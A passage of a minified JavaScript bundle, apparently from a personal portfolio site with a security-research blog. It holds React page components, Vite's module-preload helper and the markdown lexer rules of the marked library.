→"})]}),y.jsx("div",{className:"blog-list",children:a.map(o=>y.jsxs(at,{className:"blog-card",to:`/blog/${o.slug}`,children:[y.jsx("h3",{children:o.title}),y.jsxs("p",{className:"post-meta",children:[dl(o.date)," · ",o.readingTime," min read"]}),y.jsx("p",{className:"job-meta",children:o.description})]},o.slug))})]}),y.jsxs("section",{className:"card grid-2 reveal",children:[y.jsxs("div",{children:[y.jsx("h2",{children:"Leadership"}),y.jsx(Mr,{items:pf})]}),y.jsxs("div",{children:[y.jsx("h2",{children:"Education"}),y.jsx("h3",{children:il.degree}),il.lines.map(o=>y.jsx("p",{children:o},o)),y.jsx("p",{className:"job-meta",children:il.meta})]})]}),y.jsxs("section",{className:"card reveal",children:[y.jsx("h2",{children:"Achievements"}),y.jsx(Mr,{items:ff})]}),y.jsxs("section",{className:"card reveal",children:[y.jsx("h2",{children:"Get In Touch"}),y.jsxs("p",{style:{fontSize:"1.15rem",marginBottom:14},children:["I'm ",y.jsx("span",{className:"hl",children:"open to work"})," on exciting projects. Feel free to reach out!"]}),y.jsxs("p",{style:{fontSize:"1.05rem"},children:["Email me at"," ",y.jsx("a",{href:`mailto:${se.email}`,style:{fontWeight:600},children:se.email})]})]})]})}function Af(){const[a,o]=me.useState(null);Oc([a]);const l=me.useMemo(()=>[...new Set(Ct.flatMap(c=>c.tags))].sort(),[]),d=a?Ct.filter(c=>c.tags.includes(a)):Ct;return y.jsx("main",{className:"container",children:y.jsxs("section",{className:"card",children:[y.jsx("h2",{children:"Blog"}),y.jsx("p",{className:"about-text",style:{marginBottom:18},children:"Security research, malware analysis, and reverse engineering write-ups."}),y.jsxs("div",{className:"tag-filter",children:[y.jsx("button",{className:`tag${a===null?" tag-on":""}`,type:"button",onClick:()=>o(null),children:"All"}),l.map(c=>y.jsx("button",{className:`tag${a===c?" tag-on":""}`,type:"button",onClick:()=>o(c),children:c},c))]}),y.jsx("div",{className:"blog-list",children:d.map(c=>y.jsxs(at,{className:"blog-card reveal",to:`/blog/${c.slug}`,children:[y.jsx("h3",{children:c.title}),y.jsxs("p",{className:"post-meta",children:[dl(c.date)," · ",c.readingTime," min read"]}),y.jsx("p",{className:"job-meta",style:{marginBottom:10},children:c.description}),y.jsx("div",{className:"tag-list",children:c.tags.map(h=>y.jsx("span",{className:"tag",children:h},h))})]},c.slug))})]})})}const Rf="modulepreload",If=function(a){return"/"+a},Pc={},jf=function(o,l,d){let c=Promise.resolve();if(l&&l.length>0){let w=function(P){return Promise.all(P.map(T=>Promise.resolve(T).then(j=>({status:"fulfilled",value:j}),j=>({status:"rejected",reason:j}))))};document.getElementsByTagName("link");const S=document.querySelector("meta[property=csp-nonce]"),m=(S==null?void 0:S.nonce)||(S==null?void 0:S.getAttribute("nonce"));c=w(l.map(P=>{if(P=If(P),P in Pc)return;Pc[P]=!0;const T=P.endsWith(".css"),j=T?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${P}"]${j}`))return;const E=document.createElement("link");if(E.rel=T?"stylesheet":Rf,T||(E.as="script"),E.crossOrigin="",E.href=P,m&&E.setAttribute("nonce",m),document.head.appendChild(E),T)return new Promise((Q,L)=>{E.addEventListener("load",Q),E.addEventListener("error",()=>L(new Error(`Unable to preload CSS for ${P}`)))})}))}function h(w){const S=new Event("vite:preloadError",{cancelable:!0});if(S.payload=w,window.dispatchEvent(S),!S.defaultPrevented)throw w}return c.then(w=>{for(const S of w||[])S.status==="rejected"&&h(S.reason);return o().catch(h)})};function pl(){return{async:!1,breaks:!1,extensions:null,gfm:!0,hooks:null,pedantic:!1,renderer:null,silent:!1,tokenizer:null,walkTokens:null}}var _n=pl();function Fc(a){_n=a}var wn={exec:()=>null};function Gn(a){let o=[];return l=>{let d=Math.max(0,Math.min(3,l-1)),c=o[d];return c||(c=a(d),o[d]=c),c}}function X(a,o=""){let l=typeof a=="string"?a:a.source,d={replace:(c,h)=>{let w=typeof h=="string"?h:h.source;return w=w.replace(Ne.caret,"$1"),l=l.replace(c,w),d},getRegex:()=>new RegExp(l,o)};return d}var Lf=((a="")=>{try{return!!new RegExp("(?<=1)(?<!1)"+a)}catch{return!1}})(),Ne={codeRemoveIndent:/^(?: {1,4}| {0,3}\t)/gm,outputLinkReplace:/\\([\[\]])/g,indentCodeCompensation:/^(\s+)(?:```)/,beginningSpace:/^\s+/,endingHash:/#$/,startingSpaceChar:/^ /,endingSpaceChar:/ $/,nonSpaceChar:/[^ ]/,newLineCharGlobal:/\n/g,tabCharGlobal:/\t/g,multipleSpaceGlobal:/\s+/g,blankLine:/^[ \t]*$/,doubleBlankLine:/\n[ \t]*\n[ \t]*$/,blockquoteStart:/^ {0,3}>/,blockquoteSetextReplace:/\n {0,3}((?:=+|-+) *)(?=\n|$)/g,blockquoteSetextReplace2:/^ {0,3}>[ \t]?/gm,listReplaceNesting:/^ {1,4}(?=( {4})*[^ ])/g,listIsTask:/^\[[ xX]\] +\S/,listReplaceTask:/^\[[ xX]\] +/,listTaskCheckbox:/\[[ xX]\]/,anyLine:/\n.*\n/,hrefBrackets:/^<(.*)>$/,tableDelimiter:/[:|]/,tableAlignChars:/^\||\| *$/g,tableRowBlankLine:/\n[ \t]*$/,tableAlignRight:/^ *-+: *$/,tableAlignCenter:/^ *:-+: *$/,tableAlignLeft:/^ *:-+ *$/,startATag:/^<a /i,endATag:/^<\/a>/i,startPreScriptTag:/^<(pre|code|kbd|script)(\s|>)/i,endPreScriptTag:/^<\/(pre|code|kbd|script)(\s|>)/i,startAngleBracket:/^</,endAngleBracket:/>$/,pedanticHrefTitle:/^([^'"]*[^\s])\s+(['"])(.*)\2/,unicodeAlphaNumeric:/[\p{L}\p{N}]/u,escapeTest:/[&<>"']/,escapeReplace:/[&<>"']/g,escapeTestNoEncode:/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,escapeReplaceNoEncode:/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/g,caret:/(^|[^\[])\^/g,percentDecode:/%25/g,findPipe:/\|/g,splitPipe:/ \|/,slashPipe:/\\\|/g,carriageReturn:/\r\n|\r/g,spaceLine:/^ +$/gm,notSpaceStart:/^\S*/,endingNewline:/\n$/,listItemRegex:a=>new RegExp(`^( {0,3}${a})((?:[	 ][^\\n]*)?(?:\\n|$))`),nextBulletRegex:Gn(a=>new RegExp(`^ {0,${a}}(?:[*+-]|\\d{1,9}[.)])((?:[ 	][^\\n]*)?(?:\\n|$))`)),hrRegex:Gn(a=>new RegExp(`^ {0,${a}}((?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$)`)),fencesBeginRegex:Gn(a=>new RegExp(`^ {0,${a}}(?:\`\`\`|~~~)`)),headingBeginRegex:Gn(a=>new RegExp(`^ {0,${a}}#`)),htmlBeginRegex:Gn(a=>new RegExp(`^ {0,${a}}<(?:[a-z].*>|!--)`,"i")),blockquoteBeginRegex:Gn(a=>new RegExp(`^ {0,${a}}>`))},Nf=/^(?:[ \t]*(?:\n|$))+/,zf=/^((?: {4}| {0,3}\t)[^\n]+(?:\n(?:[ \t]*(?:\n|$))*)?)+/,Df=/^ {0,3}(`{3,}(?=[^`\n]*(?:\n|$))|~{3,})([^\n]*)(?:\n|$)(?:|([\s\S]*?)(?:\n|$))(?: {0,3}\1[~`]* *(?=\n|$)|$)/,Fr=/^ {0,3}((?:-[\t ]*){3,}|(?:_[ \t]*){3,}|(?:\*[ \t]*){3,})(?:\n+|$)/,Mf=/^ {0,3}(#{1,6})(?=\s|$)(.*)(?:\n+|$)/,fl=/ {0,3}(?:[*+-]|\d{1,9}[.)])/,Bc=/^(?!bull |blockCode|fences|blockquote|heading|html|table)((?:.|\n(?!\s*?\n|bull |blockCode|fences|blockquote|heading|html|table))+?)\n {0,3}(=+|-+) *(?:\n+|$)/,Uc=X(Bc).replace(/bull/g,fl).replace(/blockCode/g,/(?: {4}| {0,3}\t)/).replace(/fences/g,/ {0,3}(?:`{3,}|~{3,})/).replace(/blockquote/g,/ {0,3}>/).replace(/heading/g,/ {0,3}#{1,6}(?:\s|$)/).replace(/html/g,/ {0,3}<[^\n>]+>\n/).replace(/\|table/g,"").getRegex(),Of=X(Bc).replace(/bull/g,fl).replace(/blockCode/g,/(?: {4}| {0,3}\t)/).replace(/fences/g,/ {0,3}(?:`{3,}|~{3,})/).replace(/blockquote/g,/ {0,3}>/).replace(/heading/g,/ {0,3}#{1,6}(?:\s|$)/).replace(/html/g,/ {0,3}<[^\n>]+>\n/).replace(/table/g,/ {0,3}\|?(?:[:\- ]*\|)+[\:\- ]*\n/).getRegex(),hl=/^([^\n]+(?:\n(?!hr|heading|lheading|blockquote|fences|list|html|table|[ \t]+\n)[^\n]+)*)/,$f=/^[^\n]+/,ml=/(?!\s*\])(?:\\[\s\S]|[^\[\]\\])+/,Ff=X(/^ {0,3}\[(label)\]: *(?:\n[ \t]*)?([^<\s][^\s]*|<.*?>)(?:(?: +(?:\n[ \t]*)?| *\n[ \t]*)(title))? *(?:\n+|$)/).replace("label",ml).replace("title",/(?:"(?:\\"?|[^"\\])*"|'[^'\n]*(?:\n[^'\n]+)*\n?'|\([^()]*\))/).getRegex(),Bf=X(/^(bull)([ \t][^\n]*?)?(?:\n|$)/).replace(/bull/g,fl).getRegex(),is="address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|legend|li|link|main|menu|menuitem|meta|nav|noframes|ol|optgroup|option|p|param|search|section|summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul",gl=/<!--(?:-?>|[\s\S]*?(?:-->|$))/,Uf=X("^ {0,3}(?:<(script|pre|style|textarea)[\\s>][\\s\\S]*?(?:</\\1>[^\\n]*\\n*|$)|comment[^\\n]*(\\n+|$)|<\\?[\\s\\S]*?(?:\\?>[^\\n]*\\n*|$)|<![A-Z][\\s\\S]*?(?:>[^\\n]*\\n*|$)|<!\\[CDATA\\[[\\s\\S]*?(?:\\]\\]>[^\\n]*\\n*|$)|</?(tag)(?: +|\\n|/?>)[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$)|<(?!script|pre|style|textarea)([a-z][\\w-]*)(?:attribute)*? */?>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$)|</(?!script|pre|style|textarea)[a-z][\\w-]*\\s*>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$))","i").replace("comment",gl).replace("tag",is).replace("attribute",/ +[a-zA-Z:_][\w.:-]*(?: *= *"[^"\n]*"| *= *'[^'\n]*'| *= *[^\s"'=<>`]+)?/).getRegex(),Wc=a=>X(hl).replace("hr",Fr).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("|lheading","").replace("|table","").replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*(?:\\n|$))|~~~)[^\\n]*(?:\\n|$)").replace("list",a).replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",is).getRegex(),Wf=Wc(/ {0,3}(?:[*+-]|1[.)])[ \t]+[^ \t\n]/),Hf=Wc(/ {0,3}(?:[*+-]|\d{1,9}[.)])(?:[ \t]|\n|$)/),qf=X(/^( {0,3}> ?(paragraph|[^\n]*)(?:\n|$))+/).replace("paragraph",Hf).getRegex(),yl={blockquote:qf,code:zf,def:Ff,fences:Df,heading:Mf,hr:Fr,html:Uf,lheading:Uc,list:Bf,newline:Nf,paragraph:Wf,table:wn,text:$f},Cc=X("^ *([^\\n ].*)\\n {0,3}((?:\\| *)?:?-+:? *(?:\\| *:?-+:? *)*(?:\\| *)?)(?:\\n((?:(?! *\\n|hr|heading|blockquote|code|fences|list|html).*(?:\\n|$))*)\\n*|$)").replace("hr",Fr).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("blockquote"," {0,3}>").replace("code","(?: {4}| {0,3}	)[^\\n]").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*(?:\\n|$))|~~~)[^\\n]*(?:\\n|$)").replace("list"," {0,3}(?:[*+-]|1[.)])[ \\t]").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",is).getRegex(),Vf={...yl,lheading:Of,table:Cc,paragraph:X(hl).replace("hr",Fr).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("|lheading","").replace("table",Cc).replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*(?:\\n|$))|~~~)[^\\n]*(?:\\n|$)").replace("list"," {0,3}(?:[*+-]|1[.)])[ \\t]+[^ \\t\\n]").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",is).getRegex()},Qf={...yl,html:X(`^ *(?:comment *(?:\\n|\\s*$)|<(tag)[\\s\\S]+?</\\1> *(?:\\n{2,}|\\s*$)|<tag(?:"[^"]*"|'[^']*'|\\s[^'"/>\\s]*)*?/?> *(?:\\n{2,}|\\s*$))`).replace("comment",gl).replace(/tag/g,"(?!(?:a|em|strong|small|s|cite|q|dfn|abbr|data|time|code|var|samp|kbd|sub|sup|i|b|u|mark|ruby|rt|rp|bdi|bdo|span|br|wbr|ins|del|img)\\b)\\w+(?!:|[^\\w\\s@]*@)\\b").getRegex(),def:/^ *\[([^\]]+)\]: *<?([^\s>]+)>?(?: +(["(][^\n]+[")]))? *(?:\n+|$)/,heading:/^(#{1,6})(.*)(?:\n+|$)/,fences:wn,lheading:/^(.+?)\n {0,3}(=+|-+) *(?:\n+|$)/,paragraph:X(hl).replace("hr",Fr).replace("heading",` *#{1,6} *[^
]`).replace("lheading",Uc).replace("|table","").replace("blockquote"," {0,3}>").replace("|fences","").replace("|list","").replace("|html","").replace("|tag","").getRegex()},Kf=/^\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/,Gf=/^(`+)([^`]|[^`][\s\S]*?[^`])\1(?!`)/,Hc=/^( {2,}|\\)\n(?!\s*$)/,Yf=/^(`+|[^`])(?:(?= {2,}\n)|[\s\S]*?(?:(?=[\\<!\[`*_]|\b_|$)|[^ ](?= {2,}\n)))/,Mt=/[\p{P}\p{S}]/u,Yn=/[\s\p{P}\p{S}]/u,Br=/[^\s\p{P}\p{S}]/u,Xf=X(/^((?![*_])punctSpace)/,"u").replace(/punctSpace/g,Yn).getRegex(),Zf=/[\p{Pi}\p{Ps}"']/u,qc=/(?!~)[\p{P}\p{S}]/u,Jf=/(?!~)[\s\p{P}\p{S}]/u,eh=/(?:[^\s\p{P}\p{S}]|~)/u,th=X(/link|precode-code|html/,"g").replace("link",/\[(?:[^\[\]`]|(?<a>`+)[^`]+\k<a>(?!`))*?\]\((?:\\[\s\S]|[^\\\(\)]|\((?:\\[\s\S]|[^\\\(\)])*\))*\)/).replace("precode-",Lf?"(?<!`)()":"(^^|[^`])").replace("code",/(?<b>`+)[^`]+\k<b>(?!`)/).replace("html",/<(?! )[^<>]*?>/).getRegex(),Vc=/^(?:\*+(?:((?!\*)punct)|([^\s*]))?)|^_+(?:((?!_)punct)|([^\s_]))?/,nh=X(Vc,"u").replace(/punct/g,Mt).getRegex(),rh=X(Vc,"u").replace(/punct/g,qc).getRegex(),ih=/^(?:\*+(?:((?!\*)(?!openQuote)punct)|([^\s*]))?)|^_+(?:((?!_)(?!openQuote)punct)|([^\s_]))?/,sh=X(ih,"u").replace(/openQuote/g,Zf).replace(/punct/g,Mt).getRegex(),Qc="^[^_*]*?__[^_*]*?\\*[^_*]*?(?=__)|[^*]+(?=[^*])|(?!\\*)punct(\\*+)(?=[\\s]|$)|notPunctSpace(\\*+)(?!\\*)(?=punctSpace|$)|(?!\\*)punctSpace(\\*+)(?=notPunctSpace)|[\\s](\\*+)(?!\\*)(?=punct)|(?!\\*)punct(\\*+)(?!\\*)(?=punct)|notPunctSpace(\\*+)(?=notPunctSpace)",oh=X(Qc,"gu").replace(/notPunctSpace/g,Br).replace(/punctSpace/g,Yn).replace(/punct/g,Mt).getRegex(),lh=X(Qc,"gu").replace(/notPunctSpace/g,eh).replace(/punctSpace/g,Jf).replace(/punct/g,qc).getRegex(),ah="^[^_*]*?__[^_*]*?\\*[^_*]*?(?=__)|[^*]+(?=[^*])|(?!\\*)punct(\\*+)(?=[\\s]|$)|notPunctSpace(\\*+)(?!\\*)(?=punctSpace|$)|(?!\\*)[\\s](\\*+)(?=notPunctSpace)|[\\s](\\*+)(?!\\*)(?=punct)|(?!\\*)punct(\\*+)(?!\\*)(?=punct)|(?:(?!\\*)punct|notPunctSpace)(\\*+)(?!\\*)(?=notPunctSpace)",uh=X(ah,"gu").replace(/notPunctSpace/g,Br).replace(/punctSpace/g,Yn).replace(/punct/g,Mt).getRegex(),ch=X("^[^_*]*?\\*\\*[^_*]*?_[^_*]*?(?=\\*\\*)|[^_]+(?=[^_])|(?!_)punct(_+)(?=[\\s]|$)|notPunctSpace(_+)(?!_)(?=punctSpace|$)|(?!_)punctSpace(_+)(?=notPunctSpace)|[\\s](_+)(?!_)(?=punct)|(?!_)punct(_+)(?!_)(?=punct)","gu").replace(/notPunctSpace/g,Br).replace(/punctSpace/g,Yn).replace(/punct/g,Mt).getRegex(),dh="^[^_*]*?\\*\\*[^_*]*?_[^_*]*?(?=\\*\\*)|[^_]+(?=[^_])|(?!_)punct(_+)(?=[\\s]|$)|notPunctSpace(_+)(?!_)(?=punctSpace|$)|(?!_)[\\s](_+)(?=notPunctSpace)|[\\s](_+)(?!_)(?=punct)|(?!_)punct(_+)(?!_)(?=punct)|(?:(?!_)punct|notPunctSpace)(_+)(?!_)(?=notPunctSpace)",ph=X(dh,"gu").replace(/notPunctSpace/g,Br).replace(/punctSpace/g,Yn).replace(/punct/g,Mt).getRegex(),fh=X(/^~~?(?:((?!~)punct)|[^\s~])/,"u").replace(/punct/g,Mt).getRegex(),hh="^[^~]+(?=[^~])|(?!~)punct(~~?)(?=[\\s]|$)|notPunctSpace(~~?)(?!~)(?=punctSpace|$)|(?!~)punctSpace(~~?)(?=notPunctSpace)|[\\s](~~?)(?!~)(?=punct)|(?!~)punct(~~?)(?!~)(?=punct)|notPunctSpace(~~?)(?=notPunctSpace)",mh=X(hh,"gu").replace(/notPunctSpace/g,Br).replace(/punctSpace/g,Yn).replace(/punct/g,Mt).getRegex(),gh=X(/\\(punct)/,"gu").replace(/punct/g,Mt).getRegex(),yh=X(/^<(scheme:[^\s\x00-\x1f<>]*|email)>/).replace("scheme",/[a-zA-Z][a-zA-Z0-9+.-]{1,31}/).replace("email",/[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+(?![-_])/).getRegex(),vh=X(gl).replace("(?:-->|$)","-->").getRegex(),kh=X("^comment|^</[a-zA-Z][\\w:-]*\\s*>|^<[a-zA-Z][\\w-]*(?:attribute)*?\\s*/?>|^<\\?[\\s\\S]*?\\?>|^<![a-zA-Z]+\\s[\\s\\S]*?>|^<!\\[CDATA\\[[\\s\\S]*?\\]\\]>").replace("comment",vh).replace("attribute",/\s+[a-zA-Z:_][\w.:-]*(?:\s*=\s*"[^"]*"|\s*=\s*'[^']*'|\s*=\s*[^\s"'=<>`]+)?/).getRegex(),ts=/(?:\[(?:\\[\s\S]|[^\[\]\\])*\]|\\[\s\S]|`+(?!`)[^`]*?`+(?!`)|``+(?=\])|[^\[\]\\`])*?/,wh=X(/^!?\[(label)\]\(\s*(href)(?:(?:[ \t]+(?:\n[ \t]*)?|\n[ \t]*)(title))?\s*\)/).replace("label",ts).replace("href",/<(?:\\.|[^\n<>\\])+>|[^ \t\n\x00-\x1f]+|(?=\))/).replace("title",/"(?:\\"?|[^"\\])*"|'(?:\\'?|[^'\\])*'|\((?:\\\)?|[^)\\])*\)/).getRegex(),Kc=X(/^!?\[(label)\]\[(ref)\]/).replace("label",ts).replace("ref",ml).getRegex(),Gc=X(/^!?\[(ref)\](?:\[\])?/).replace("ref",ml).getRegex(),xh=X("reflink|nolink(?!\\()","g").replace("reflink",Kc).replace("nolink",Gc).getRegex(),bc=/[hH][tT][tT][pP][sS]?|[fF][tT][pP]/,vl={_backpedal:wn,anyPunctuation:gh,autolink:yh,blockSkip:th,br:Hc,code:Gf,del:wn,delLDelim:wn,delRDelim:wn,emStrongLDelim:nh,emStrongRDelimAst:oh,emStrongRDelimUnd:ch,escape:Kf,link:wh,nolink:Gc,punctuation:Xf,reflink:Kc,reflinkSearch:xh,tag:kh,text:Yf,url:wn},Sh={...vl,emStrongLDelim:sh,emStrongRDelimAst:uh,emStrongRDelimUnd:ph,link:X(/^!?\[(label)\]\((.*?)\)/).replace("label",ts).getRegex(),reflink:X(/^!?\[(label)\]\s*\[([^\]]*)\]/).replace("label",ts).getRegex()},ol={...vl,emStrongRDelimAst:lh,emStrongLDelim:rh,delLDelim:fh,delRDelim:mh,url:X(/^((?:protocol):\/\/|www\.)(?:[a-zA-Z0-9\-]+\.?)+[^\s<]*|^email/).replace("protocol",bc).replace("email",/[A-Za-z0-9._+-]+(@)[a-zA-Z0-9-_]+(?:\.[a-zA-Z0-9-_]*[a-zA-Z0-9])+(?![-_])/).getRegex(),_backpedal:/(?:[^?!.,:;*_'"~()&]+|\([^)]*\)|&(?![a-zA-Z0-9]+;$)|[?!.,:;*_'"~)]+(?!$))+/,del:/^(~~?)(?=[^\s~])((?:\\[\s\S]|[^\\])*?(?:\\[\s\S]|[^\s~\\]))\1(?=[^~]|$)/,text:X(/^(`+|~+|[^`~])(?:(?=[`~])|(?= {2,}\n)|(?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)|[\s\S]*?(?:(?=[\\<!\[`*~_]|\b_|protocol:\/\/|www\.|$)|[^ ](?= {2,}\n)|[^a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-](?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)))/).replace("protocol",bc).getRegex()},_h={...ol,br:X(Hc).replace("{2,}","*").getRegex(),text:X(ol.text).replace("\\b_","\\b_| {2,}\\n").replace(/\{2,\}/g,"*").getRegex()},Ji={normal:yl,gfm:Vf,pedantic:Qf},Or={normal:vl,gfm:ol,breaks:_h,pedantic:Sh},Eh={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},Ac=a=>Eh[a];function Pt(a,o){if(o){if(Ne.escapeTest.test(a))return a.replace(Ne.escapeReplace,Ac)}else if(Ne.escapeTestNoEncode.test(a))return a.replace(Ne.escapeReplaceNoEncode,Ac);return a}function Rc(a){try{a=encodeURI(a).replace(Ne.percentDecode,"%")}catch{return null}return a}function Ic(a,o){var h;let l=a.replace(Ne.findPipe,(w,S,m)=>{let P=!1,T=S;for(;--T>=0&&m[T]==="\\";)P=!P;return P?"|":" |"}),d=l.split(Ne.splitPipe),c=0;if(d[0].trim()||d.shift(),d.length>0&&!((h=d.at(-1))!=null&&h.trim())&&d.pop(),o)if(d.length>o)d.splice(o);else for(;d.length<o;)d.push("");for(;c<d.length;c++)d[c]=d[c].trim().replace(Ne.slashPipe,"|");return d}function sn(a,o,l){let d=a.length;if(d===0)return"";let c=0;for(;c<d&&a.charAt(d-c-1)===o;)c++;return a.slice(0,d-c)}function jc(a){let o=a.split(`
`),l=o.length-1;for(;l>=0&&Ne.blankLine.test(o[l]);)l--;return o.length-l<=2?a:o.slice(0,l+1).join(`
`)}function Th(a,o){if(a.indexOf(o[1])===-1)return-1;let l=0;for(let d=0;d<a.length;d++)if(a[d]==="\\")d++;else if(a[d]===o[0])l++;else if(a[d]===o[1]&&(l--,l<0))return d;return l>0?-2:-1}function Ph(a,o=0){let l=o,d="";for(let c of a)if(c==="	"){let h=4-l%4;d+=" ".repeat(h),l+=h}else d+=c,l++;return d}function Lc(a,o,l,d,c){let h=o.href,w=o.title||null,S=a[1].replace(c.other.outputLinkReplace,"$1"),m=a[0].charAt(0)==="!";d.state.inLink=!0;let P=d.state.linkEmitted,T=d.state.inRawBlock;d.state.linkEmitted=!1;let j=d.inlineTokens(S),E=d.state.linkEmitted;if(d.state.linkEmitted=P,d.state.inLink=!1,!m){if(E){d.state.inRawBlock=T;return}d.state.linkEmitted=!0}return{type:m?"image":"link",raw:l,href:h,title:w,text:S,tokens:j}}function Ch(a,o,l){let d=a.match(l.other.indentCodeCompensation);if(d===null)return o;let c=d[1];return o.split(`
`).map(h=>{let w=h.match(l.other.beginningSpace);if(w===null)return h;let[S]=w;return S.length>=c.length?h.slice(c.length):h}).join(`
`)}var ns=class{constructor(a){ie(this,"options");ie(this,"rules");ie(this,"lexer");this.options=a||_n}space(a){let o=this.rules.block.newline.exec(a);if(o&&o[0].length>0)return{type:"space",raw:o[0]}}code(a){let o=this.rules.block.code.exec(a);if(o){let l=this.options.pedantic?o[0]:jc(o[0]),d=l.replace(this.rules.other.codeRemoveIndent,"");return{type:"code",raw:l,codeBlockStyle:"indented",text:d}}}fences(a){let o=this.rules.block.fences.exec(a);if(o){let l=o[0],d=Ch(l,o[3]||"",this.rules);return{type:"code",raw:l,lang:o[2]?o[2].trim().replace(this.rules.inline.anyPunctuation,"$1"):o[2],text:d}}}heading(a){let o=this.rules.block.heading.exec(a);if(o){let l=o[2].trim();if(this.rules.other.endingHash.test(l)){let d=sn(l,"#");(this.options.pedantic||!d||this.rules.other.endingSpaceChar.test(d))&&(l=d.trim())}return{type:"heading",raw:sn(o[0],`
`),depth:o[1].length,text:l,tokens:this.lexer.inline(l)}}}hr(a){let o=this.rules.block.hr.exec(a);if(o)return{type:"hr",raw:sn(o[0],`
`)}}blockquote(a){let o=this.rules.block.blockquote.exec(a);if(o){let l=sn(o[0],`
`).split(`
`),d="",c="",h=[];for(;l.length>0;){let w=!1,S=[],m;for(m=0;m<l.length;m++)if(this.rules.other.blockquoteStart.test(l[m]))S.push(l[m]),w=!0;else if(!w)S.push(l[m]);else break;l=l.slice(m);let P=S.join(`
`),T=P.replace(this.rules.other.blockquoteSetextReplace,`
    $1`).replace(this.rules.other.blockquoteSetextReplace2,"");d=d?`${d}
${P}`:P,c=c?`${c}
${T}`:T;let j=this.lexer.state.top;if(this.lexer.state.top=!0,this.lexer.blockTokens(T,h,!0),this.lexer.state.top=j,l.length===0)break;let E=h.at(-1);if((E==null?void 0:E.type)==="code")break;if((E==null?void 0:E.type)==="blockquote"){let Q=E,L=l.join(`
`),q=Q.raw+`
`+L.replace(this.rules.other.blockquoteSetextReplace2,""),V=this.blockquote(q);h[h.length-1]=V,d=`${d}
${L}`,c=c.substring(0,c.length-Q.text.length)+V.text;break}else if((E==null?void 0:E.type)==="list"){let Q=E,L=Q.raw+`
`+l.join(`
`),q=this.list(L);h[h.length-1]=q,d=d.substring(0,d.length-E.raw.length)+q.raw,c=c.substring(0,c.length-Q.raw.length)+q.raw,l=L.substring(h.at(-1).raw.length).split(`
`);continue}}return{type:"blockquote",raw:d,tokens:h,text:c}}}list(a){let o=this.rules.block.list.exec(a);if(o){let l=o[1].trim(),d=l.length>1,c={type:"list",raw:"",ordered:d,start:d?+l.slice(0,-1):"",loose:!1,items:[]};l=d?`\\d{1,9}\\${l.slice(-1)}`:`\\${l}`,this.options.pedantic&&(l=d?l:"[*+-]");let h=this.rules.other.listItemRegex(l),w=!1;for(;a;){let m=!1,P="",T="";if(!(o=h.exec(a))||this.rules.block.hr.test(a))break;P=o[0],a=a.substring(P.length);let j=Ph(o[2].split(`
`,1)[0],o[1].length),E=a.split(`
`,1)[0],Q=!j.trim(),L=0;if(this.options.pedantic?(L=2,T=j.trimStart()):Q?L=o[1].length+1:(L=j.search(this.rules.other.nonSpaceChar),L=L>4?1:L,T=j.slice(L),L+=o[1].length),Q&&this.rules.other.blankLine.test(E)&&(P+=E+`
`,a=a.substring(E.length+1),m=!0),!m){let q=this.rules.other.nextBulletRegex(L),V=this.rules.other.hrRegex(L),Oe=this.rules.other.fencesBeginRegex(L),Qe=this.rules.other.headingBeginRegex(L),Ke=this.rules.other.htmlBeginRegex(L),Ee=this.rules.other.blockquoteBeginRegex(L);for(;a;){let ze=a.split(`
`,1)[0],ve;if(E=ze,this.options.pedantic?(E=E.replace(this.rules.other.listReplaceNesting,"  "),ve=E):ve=E.replace(this.rules.other.tabCharGlobal,"    "),Oe.test(E)||Qe.test(E)||Ke.test(E)||Ee.test(E)||q.test(E)||V.test(E))break;if(ve.search(this.rules.other.nonSpaceChar)>=L||!E.trim())T+=`
`+ve.slice(L);else{if(Q||j.replace(this.rules.other.tabCharGlobal,"    ").search(this.rules.other.nonSpaceChar)>=4||Oe.test(j)||Qe.test(j)||V.test(j))break;T+=`
`+E}Q=!E.trim(),P+=ze+`
